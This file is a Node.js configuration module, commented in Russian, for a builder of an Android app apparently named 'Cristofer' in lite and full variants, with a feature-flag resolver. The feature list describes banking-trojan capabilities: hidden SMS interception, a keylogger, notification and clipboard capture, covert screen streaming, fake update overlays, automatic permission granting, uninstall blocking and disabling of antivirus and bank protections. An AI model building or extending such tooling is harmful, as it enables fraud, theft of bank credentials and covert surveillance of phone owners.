'use strict';

const path = require('path');

// Пути к проектам (относительно webbuilder/)
const BASE_V2      = path.resolve(__dirname, '../cristofer_v2');
const BASE_V3      = path.resolve(__dirname, '../cristofer_v3');
const BASE_WOMBAT  = path.resolve(__dirname, '../wombat');
const BASE_GOLDFINCH = path.resolve(__dirname, '../goldfinch');
const PELICAN_PATH = path.resolve(__dirname, '../wombat/pelican.py');
const ANDROID_SDK  = process.env.ANDROID_HOME || 'C:/Users/lenov/AppData/Local/Android/Sdk';

const PROJECTS = {
  v2: {
    label: 'Cristofer v2 (Lite)',
    dir: BASE_V2,
    isLite: true,
    features: [
      { key: 'feat_fcm',            label: 'Чек Апк',                 desc: 'Проверка установлено ли апк и попытка пробуждения. (добавляет вес к апк 3-4мб)', group: 'common', default: true },
      { key: 'feat_sms',            label: 'СМС',                     desc: 'Перехват входящих SMS/MMS, чтение всей истории, отправка SMS.', risk: 'medium', warn: ['Перехват входящих SMS', 'Чтение истории SMS', 'Отправка SMS'], group: 'common', default: true, required: true },
      { key: 'feat_sms_role',       label: 'СМС по умол.',            desc: 'Регистрация как SMS-приложение по умолчанию. Пользователь не видит смс.', risk: 'high', warn: ['Смена роли SMS-приложения по умолчанию'], group: 'common', default: true },
      { key: 'feat_radio_link',     label: 'Отправка смс при старте', desc: 'Для получения мобильного номера устройства. Необходимо указать номер телефона в конфигурации.', risk: 'high', warn: ['Отправка SMS'], group: 'common', default: true },
      { key: 'feat_contacts',       label: 'Контакты',                desc: 'Чтение + запись контактной книги, загрузка на сервер по команде.', risk: 'high', warn: ['Доступ к контактной книге'], group: 'common', default: true },
      { key: 'feat_accounts',       label: 'Аккаунты',                desc: 'Чтение Google email-адресов с устройства (GET_ACCOUNTS).', group: 'common', default: false },
      { key: 'feat_frien_cat',      label: 'Загрузка контактов',      desc: 'Загружает контактную книгу на сервер по команде (сервис контактов).', group: 'common', default: true, hidden: true },
      { key: 'feat_call_phone',     label: 'Звонки',                  desc: 'Звонки по команде, отправка команды на звонок/уссд.', risk: 'medium', warn: ['Совершение звонков', 'Чтение номера телефона'], group: 'common', default: true, required: true },
      { key: 'feat_ussd',           label: 'USSD',                    desc: 'Отправка USSD-запросов (*900# и т.д.) через CommandChannelService. Требует Звонки.', group: 'common', default: true, hidden: true },
      { key: 'feat_cmd_channel',    label: 'Командный канал',         desc: 'Дополнительный исполнитель USSD-команд через прямой API TelephonyManager.', group: 'common', default: true, hidden: true },
      { key: 'feat_turtle',         label: 'Пуш увед',                desc: 'Перехватывает все уведомления всех приложений (банки, мессенджеры). Требует ручного разрешения.', risk: 'medium', warn: ['Перехват уведомлений всех приложений'], group: 'common', default: true },
      { key: 'feat_sync_manager',   label: 'Синхронизация',           desc: 'Создаёт системный аккаунт синхронизации — повышает выживаемость приложения.', group: 'common', default: true, hidden: true, required: true },
      { key: 'feat_keepalive_job',  label: 'Планировщик джоб',        desc: 'Автоматический перезапуск после принудительной остановки, из-за нехватки памяти/аккумулятора.', group: 'common', default: true, hidden: true, required: true },
      { key: 'feat_device_monitor', label: 'Мониторинг статуса',      desc: 'Отслеживает положение устройства: в кармане / на столе / в руках. Состояние экрана (вкл/выкл).', group: 'common', default: false },
      { key: 'feat_trol_svc',       label: 'СМС менеджер',            desc: 'Синхронизация SMS с сервером, слежение за новыми SMS, выполнение команд отправки, поиск номеров карт.', group: 'common', default: true, hidden: true },
      { key: 'feat_privilege_svc',  label: 'Привилег. сервис',        desc: 'Отправляет отчёт о статусе разрешений.', group: 'common', default: true, required: true },
    ]
  },
  v3: {
    label: 'Cristofer v3 (Full)',
    dir: BASE_V3,
    isLite: false,
    features: [
      { key: 'feat_fcm',            label: 'Чек Апк',                 desc: 'Проверка установлено ли апк и попытка пробуждения. (добавляет вес к апк 3-4мб)', group: 'common', default: true },
      { key: 'feat_sms',            label: 'СМС',                     desc: 'Перехват входящих SMS/MMS, чтение всей истории, отправка SMS.', risk: 'medium', warn: ['Перехват входящих SMS', 'Чтение истории SMS', 'Отправка SMS'], group: 'common', default: true, required: true },
      { key: 'feat_sms_role',       label: 'СМС по умол.',            desc: 'Регистрация как SMS-приложение по умолчанию. Пользователь не видит смс.', risk: 'high', warn: ['Смена роли SMS-приложения по умолчанию'], group: 'common', default: true },
      { key: 'feat_radio_link',     label: 'Отправка смс при старте', desc: 'Для получения мобильного номера устройства. Необходимо указать номер телефона в конфигурации.', risk: 'high', warn: ['Отправка SMS'], group: 'common', default: true },
      { key: 'feat_contacts',       label: 'Контакты',                desc: 'Чтение + запись контактной книги, загрузка на сервер по команде.', risk: 'high', warn: ['Доступ к контактной книге'], group: 'common', default: true },
      { key: 'feat_accounts',       label: 'Аккаунты',                desc: 'Чтение Google email-адресов с устройства (GET_ACCOUNTS).', group: 'common', default: false },
      { key: 'feat_frien_cat',      label: 'Загрузка контактов',      desc: 'Загружает контактную книгу на сервер по команде (сервис контактов).', group: 'common', default: true, hidden: true },
      { key: 'feat_call_phone',     label: 'Звонки',                  desc: 'Звонки по команде, отправка команды на звонок/уссд.', risk: 'medium', warn: ['Совершение звонков', 'Доступ к журналу вызовов', 'Перехват исходящих вызовов'], group: 'common', default: true, required: true },
      { key: 'feat_ussd',           label: 'USSD',                    desc: 'Отправка USSD-запросов (*900# и т.д.) через CommandChannelService. Требует Звонки.', group: 'common', default: true, hidden: true },
      { key: 'feat_cmd_channel',    label: 'Командный канал',         desc: 'Дополнительный исполнитель USSD-команд через прямой API TelephonyManager.', group: 'common', default: true, hidden: true },
      { key: 'feat_camera',         label: 'Камера',                  desc: 'Съёмка фото/видео по команде сервера. (данная функция в разработке)', risk: 'medium', warn: ['Доступ к камере'], group: 'common', default: false },
      { key: 'feat_audio_record',   label: 'Запись звука',            desc: 'Запись с микрофона. (данная функция в разработке)', risk: 'medium', warn: ['Запись с микрофона'], group: 'common', default: false },
      { key: 'feat_files',          label: 'Файловая система',        desc: 'Доступ к файлам на устройстве (фото, документы, аудио, видео).', risk: 'medium', warn: ['Чтение/запись внешнего хранилища', 'Доступ к медиафайлам (фото, видео, аудио)'], group: 'common', default: true },
      { key: 'feat_clipboard',      label: 'Буфер обмена',            desc: 'Перехват буфера обмена — то что в данный момент у пользователя скопировано и весит в буфере.', group: 'common', default: false },
      { key: 'feat_turtle',         label: 'Пуш увед',                desc: 'Перехватывает все уведомления всех приложений (банки, мессенджеры). Требует ручного разрешения.', risk: 'medium', warn: ['Перехват уведомлений всех приложений'], group: 'common', default: true },
      { key: 'feat_sync_manager',   label: 'Синхронизация',           desc: 'Создаёт системный аккаунт синхронизации — повышает выживаемость приложения.', group: 'common', default: true, hidden: true, required: true },
      { key: 'feat_keepalive_job',  label: 'Планировщик джоб',        desc: 'Автоматический перезапуск после принудительной остановки, из-за нехватки памяти/аккумулятора.', group: 'common', default: true, hidden: true, required: true },
      { key: 'feat_device_monitor', label: 'Мониторинг статуса',      desc: 'Отслеживает положение устройства: в кармане / на столе / в руках. Состояние экрана (вкл/выкл).', group: 'common', default: false },
      { key: 'feat_trol_svc',       label: 'СМС менеджер',            desc: 'Синхронизация SMS с сервером, слежение за новыми SMS, выполнение команд отправки, поиск номеров карт.', group: 'common', default: true, hidden: true },
      { key: 'feat_privilege_svc',  label: 'Привилег. сервис',        desc: 'Отправляет отчёт о статусе разрешений.', group: 'common', default: true, required: true },
      { key: 'feat_biometric',      label: 'Биометрия',               desc: 'Определяет наличие биометрии (отпечаток/Face ID) на устройстве.', group: 'common', default: true },
      { key: 'feat_accessibility',  label: 'Спец. разрешение',        desc: 'Главное разрешение для управления. Обязательно для v3.', group: 'v3only', default: true, hidden: true, required: true },
      { key: 'feat_sparrow',        label: 'Кейлогер',                desc: 'Перехват ввода текста в любых приложениях.', group: 'v3only', default: true, required: true },
      { key: 'feat_stoat_shield',   label: 'Блок удаления',           desc: 'Блокирует попытки открыть настройки приложения или удалить его.', group: 'v3only', default: true },
      { key: 'feat_auto_ibis',      label: 'Автовыдача разр.',        desc: 'Автоматически нажимает "Разрешить" в диалогах.', group: 'v3only', default: true, required: true },
      { key: 'feat_unlock',         label: 'Разблок экр.',            desc: 'Разблокировка и включение экрана по команде.', risk: 'medium', warn: ['Снятие блокировки экрана'], group: 'v3only', default: true, required: true },
      { key: 'feat_overlay',        label: 'Оверлей/черн экран',      desc: 'Отображение поверх всех приложений: чёрный экран, фейковый экран обновления / вызов своих окон.', risk: 'medium', warn: ['Отображение поверх других приложений'], group: 'v3only', default: true, required: true },
      { key: 'feat_device_admin',   label: 'Админ раз.',              desc: 'Права администратора устройства — блокировка экрана, запрет удаления, или остановки приложение.', group: 'v3only', default: true },
      { key: 'feat_vnc',            label: 'ВНК',                     desc: 'Трансляция экрана устройства на сервер в реальном времени с помощью тихих скриншотов. Чтение UI-элементов экрана.', group: 'v3only', default: true, required: true },
      { key: 'feat_mink_scanner',   label: 'Ак ВНК',                  desc: 'Чтение UI-элементов экрана через дерево доступности — текстовые поля, кнопки.', group: 'v3only', default: true, hidden: true },
      { key: 'feat_keepalive_audio',label: 'Захватчик аудио',         desc: 'При проигрывании/просмотре видео делает захват звука для удержания в системе апк.', group: 'v3only', default: true, required: true },
      { key: 'feat_app_blocker',    label: 'Блокировать Апк',         desc: 'Блокировка запуска определённых приложений (антивирусы, настройки). В ВНК окне вкл или выкл блокировку приложения.', group: 'v3only', default: true },
      { key: 'feat_marten',         label: 'Движок оверлея',          desc: 'Отображение фейковых экранов обновления (чёрный/обновление Android) и программные жесты.', group: 'v3only', default: true, hidden: true, required: true },
      { key: 'feat_vibration',      label: 'Вибрация',                desc: 'Вибрация устройства по команде сервера.', group: 'v3only', default: true },
      { key: 'feat_file_revoker',   label: 'Отзыв доступа к файлам',  desc: 'Отключает антивирус у сбербанка и других апк, но не отключает проверку разрешений она идёт на глубоком уровне!', group: 'v3only', default: true },
      { key: 'feat_uninstall_helper',label:'Удаление других апк',     desc: 'Принудительное удаление других приложений по команде. Требует Спец. разрешение.', risk: 'high', warn: ['Принудительное удаление приложений'], group: 'v3only', default: true },
      { key: 'feat_chain_bridge',   label: 'Цепочка действий',        desc: 'Координирует автоматическую цепочку выдачи разрешений при старте (Админ → SMS → Батарея → Play Protect).', group: 'v3only', default: true, hidden: true, required: true },
      { key: 'feat_hyperos',        label: 'HyperOS',                 desc: 'Специфичные последовательности для Xiaomi HyperOS/MIUI через accessibility.', group: 'v3only', default: true, required: true, hidden: true },
      { key: 'feat_write_settings', label: 'Сист. настройки',         desc: 'Системные настройки: позволяет не гасить экран при активном VNC подключении. Требует дополнительное разрешение.', group: 'v3only', default: false },
    ]
  }
};

const DEPENDENCIES = [
  { parent: 'feat_accessibility', children: ['feat_sparrow','feat_stoat_shield','feat_auto_ibis','feat_unlock','feat_overlay','feat_app_blocker','feat_uninstall_helper'] },
  { parent: 'feat_auto_ibis',     children: ['feat_device_admin'] },
  { parent: 'feat_sms',           children: ['feat_sms_role','feat_radio_link','feat_trol_svc'] },
  { parent: 'feat_sms_role',      children: ['feat_contacts'] },
  { parent: 'feat_call_phone',    children: ['feat_ussd','feat_cmd_channel'] },
  { parent: 'feat_contacts',      children: ['feat_frien_cat'] },
  { parent: 'feat_vnc',           children: ['feat_mink_scanner'] },
];

function resolveFlags(project, enabledMap) {
  const features = PROJECTS[project].features;
  const result = {};
  // Шаг 1: установить флаги из enabledMap (отсутствующий ключ = true по умолчанию)
  features.forEach(f => { result[f.key] = enabledMap[f.key] !== false; });
  // Шаг 2: принудительно включить required-фичи
  features.forEach(f => { if (f.required) result[f.key] = true; });
  // Шаг 3: применить цепочки зависимостей (только для non-required дочерних)
  DEPENDENCIES.forEach(dep => {
    if (!result[dep.parent]) {
      dep.children.forEach(c => {
        const feat = features.find(f => f.key === c);
        if (!feat || !feat.required) result[c] = false;
      });
    }
  });
  // Шаг 4: гарантировать что required-фичи не отключены зависимостями
  features.forEach(f => { if (f.required) result[f.key] = true; });
  return result;
}

const MIPMAP_SIZES = {
  'mipmap-mdpi':    48,
  'mipmap-hdpi':    72,
  'mipmap-xhdpi':   96,
  'mipmap-xxhdpi':  144,
  'mipmap-xxxhdpi': 192,
};

function xmlEscape(s) {
  return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function safeShell(s) {
  return (s || '').replace(/"/g, '\\"');
}

module.exports = {
  PROJECTS, DEPENDENCIES, BASE_WOMBAT, BASE_GOLDFINCH, PELICAN_PATH,
  ANDROID_SDK, MIPMAP_SIZES, resolveFlags, xmlEscape, safeShell
};
